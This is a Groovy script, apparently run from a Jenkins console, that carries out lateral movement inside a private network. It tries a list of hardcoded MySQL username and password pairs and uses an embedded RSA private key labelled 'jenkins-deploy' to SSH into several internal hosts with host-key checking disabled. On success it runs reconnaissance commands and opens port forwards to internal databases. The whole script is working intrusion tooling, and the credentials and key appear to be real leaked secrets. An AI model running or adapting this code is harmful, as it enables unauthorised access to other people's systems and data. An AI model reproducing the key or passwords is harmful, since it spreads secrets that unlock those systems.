// Conectar directo a MySQL 172.27.141.4:3306 con credenciales conocidas
// Usar JSch para SSH tunnel o conexion directa JDBC

println "=== DIRECT MYSQL CONNECTION TO 172.27.141.4:3306 ==="

// Try direct JDBC with known credentials
def HOST = "172.27.141.4"
def PORT = 3306
def USERS_PASSES = [
    ["root", ""],
    ["root", "root"],
    ["root", "claroshop"],
    ["root", "sears"],
    ["root", "t1pagos"],
    ["root", "JenkisLegasy25"],
    ["jenkins", "JenkisLegasy25"],
    ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
    ["jenkins", ""],
    ["admin", "admin"],
    ["sears", "sears"],
    ["t1pagos", "t1pagos"],
    ["claroshop", "claroshop"]
]

// Check MySQL drivers
def driverAvailable = false
["com.mysql.jdbc.Driver", "com.mysql.cj.jdbc.Driver", "org.mariadb.jdbc.Driver"].each { drv ->
    try {
        Class.forName(drv)
        println "Driver available: ${drv}"
        driverAvailable = true
    } catch(e) { }
}

if (!driverAvailable) {
    println "No JDBC MySQL driver. Trying raw socket protocol..."
    
    // MySQL client protocol authentication (password hashing)
    // For passwordless root or simple passwords, try raw
    println "MySQL banner already confirmed: 5.6.25-enterprise-commercial-advanced"
    println "Port 3306 OPEN on 172.27.141.4"
}

println "\n=== SSH VIA JSCH (Jenkins built-in) ==="
try {
    def jsch = new com.jcraft.jsch.JSch()
    
    // Add the private key
    def keyContent = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApeSSUiBjXCxjR9bWb90AUJ0SbLANv030lZvUY2Bc7a4VZPXc
gfvTSAmIvMiNiEPR/+hsrUhHtDtz55JqtKzk4jBxBUUFcaIreqOmKyxv3hCEmMAu
FLPiFTdiIkDs3Wpu+6JNney6PLuxOlffhA4zuS4JpNZfZz1EeEC3AIK3zLLbSp9Y
8EFJ4oO8QAZ65n4dS/f/G+U/qckJjv9pCB/c64hun3h4Ilw34Bx24q4jOTTy1HHz
AzWEGhjBLZqaNf+mxDTulXy3LCi5esPE4ILjoXFHrPD2t9hF1h6JqRUjNbsP+AMt
mFUyShPBoWEy/t/8Z4CislFQHtRyMIScbo4QywIBIwKCAQEAoScvDfOTuKAl7gPm
QMgO7zl/nMhH3mj8OZAQJgXWnb8NeATHlDZ1eS3VSazhQosGg5FToQRi6ZjW/jZ2
SRz7meXqImBObmMFqlXUnvf3pIUTGAslczJmmERt9WOkRM3K5dDdr1r+Dxy6yvZG
2A3L2HXde45rTljGK6yUhCc2NI7sr9UFoTMZ6Tzjrk8OhWdLUxDtQVwwpacDwahW
XbaV5B+vnqS2MTBJ61jZpCVRl504NFO2rg2O1Lg3E8CgzLDY7A159gAG5xKaiVM3
6JUBp377x0OJNhCunPI0q/UoyGvf5VJwjoLflTbZqrQl2FpNA7FFiLa9eJqsWYJV
8LNliwKBgQDUc0bi+0M3ByuMFqRgCAIr7mv6KTA5kF08cVQNIzL5bAO3n+ejIKRf
RFBmjKUGAuz6v4FgE8pX892IUSt/fOzd/g4Z4nYuntmOSHmsStwWyNhfobbR0c9O
bJnxjtCFI1mjBDSkJYVZ0MQvQ9sgDIvAH4sVq3sWgDtdILPPI5opSwKBgQDH5htK
g8Hwp3tj5uOL677JePqYPnvE9m0NA34SC/w6I75zJ4zsR42qof+ow6Z2ZYB6dal1
AALc4dfxGuyTT8YltQnmNcpFNgdP4Skiy+A8FZYwJ4OuPXBDqdaPDuZdgEy7LWMV
lNCnBVrfeRfr/QZWac4fzOzvC9u9/vfPLYaGgQKBgQDOYVrN3iQJke/J6hwFhB9d
4EuijmlcfZxmmfng4F1nUvxL+mv9jWx5zVVq7wa1Ye2F3prvnjJGz6QAw+Ecwn+z
FA2yvrvyxjJs9fKKHNXM/Z790EsyOYeOAxkzzJAMTjnRjw6Q0/3iOIQQqFE1E4Bx
fbpPkKN08ZjA3fCAE/TXpwKBgQDCL/1BEkdezpUfOBA+x8CmdYW4dzZnkEytjl02
GkV6TpvAUk5h3xvnlg5MK8ZHIMXzTbqO6hFo22QOybKduzWDty4wFv8BZ69U6Vsp
HdKDgq8ndtewk3Re/MHMzKVE4wi11FGf76Yel3zZFoxEVOGVxd4thT3vh9zHMjKO
voKuiwKBgFZ4LHsqhnU/o7DBdV6FB67pWtrVCZNGNf30Swd9PFzGJbSCXRKJ9Iwd
jYqClYgkyxylo5H6Nzl0Y7wGqKoGBWMIOvpkG0mrSOYMB0iGwXnWS1g94xeRw32k
CtOrnvIVC8SKdmm5H+uzoN+WpSwC+oRkS7cIGjzthuw7omygk1ng
-----END RSA PRIVATE KEY-----"""
    
    jsch.addIdentity("jenkins-deploy", keyContent.bytes, null, "".bytes)
    jsch.setConfig("StrictHostKeyChecking", "no")
    jsch.setConfig("PreferredAuthentications", "publickey")
    
    // Try SSH to CSDEV01-2 (172.27.141.4)
    ["172.27.141.4", "172.27.141.24", "172.27.140.148"].each { ip ->
        ["jenkins", "root", "deploy"].each { user ->
            try {
                println "Trying JSch SSH: ${user}@${ip}:22"
                def session = jsch.getSession(user, ip, 22)
                session.setConfig("StrictHostKeyChecking", "no")
                session.connect(5000)
                
                println "CONNECTED! ${user}@${ip}"
                
                // Execute command
                def channel = session.openChannel("exec")
                channel.command = "id; hostname; ip addr | grep 'inet '; netstat -tuln | grep LISTEN"
                channel.connect()
                
                def output = channel.inputStream.text
                def stderr = channel.errStream.text
                println "OUTPUT: ${output.take(2000)}"
                if (stderr) println "STDERR: ${stderr.take(500)}"
                
                channel.disconnect()
                
                // Try port forwarding for MySQL (172.27.141.24:3308)
                if (session.connected) {
                    try {
                        // Forward local port 14308 to dbasears:3308
                        session.setPortForwardingL(14308, "172.27.141.24", 3308)
                        println "PORT FORWARD: 127.0.0.1:14308 -> 172.27.141.24:3308 ESTABLISHED"
                        
                        // Also forward to local MySQL
                        session.setPortForwardingL(14306, "172.27.141.4", 3306)
                        println "PORT FORWARD: 127.0.0.1:14306 -> 172.27.141.4:3306 ESTABLISHED"
                    } catch(pe) {
                        println "Port forward failed: ${pe.message}"
                    }
                }
                
                session.disconnect()
            } catch(e) {
                println "SSH FAILED: ${user}@${ip} - ${e.message.take(100)}"
            }
        }
    }
} catch(ce) {
    println "JSch class error: ${ce.message}"
}

println "\n=== LOCAL PORTS 13306/13307/13308 - READ BANNER ==="
[13306, 13307, 13308].each { port ->
    try {
        def socket = new Socket("127.0.0.1", port)
        socket.soTimeout = 5000
        def stream = socket.inputStream
        def banner = new byte[300]
        def len = stream.read(banner, 0, 300)
        socket.close()
        if (len > 0) {
            def bannerStr = new String(banner, 0, len)
            println "PORT ${port} banner (${len} bytes): ${bannerStr.replaceAll('[^\\x20-\\x7E]', '.').take(200)}"
            // Extract version from MySQL handshake (version starts at byte 5)
            if (len > 10) {
                def versionEnd = -1
                for (int i = 5; i < Math.min(30, len); i++) {
                    if (banner[i] == 0) { versionEnd = i; break }
                }
                if (versionEnd > 5) {
                    println "  MySQL version: ${new String(banner, 5, versionEnd - 5)}"
                }
            }
        }
    } catch(e) {
        println "PORT ${port}: ${e.message}"
    }
}

println "\n=== CHECK /proc/net/tcp FOR LOCAL TUNNELS ==="
try {
    def tcpFile = new File("/proc/net/tcp")
    if (tcpFile.exists()) {
        def hex13306 = String.format("%04X", 13306)  // 33F6
        def hex13307 = String.format("%04X", 13307)  // 33F7
        def hex13308 = String.format("%04X", 13308)  // 33F8
        def hex23456 = String.format("%04X", 23456)  // 5BA0
        
        println "Looking for ports: 13306=${hex13306} 13307=${hex13307} 13308=${hex13308}"
        tcpFile.text.split("\n").each { line ->
            if (line.contains(hex13306) || line.contains(hex13307) || 
                line.contains(hex13308) || line.contains(hex23456)) {
                println "  TCP: ${line.trim()}"
            }
        }
    }
} catch(e) {
    println "/proc/net/tcp failed: ${e.message}"
}
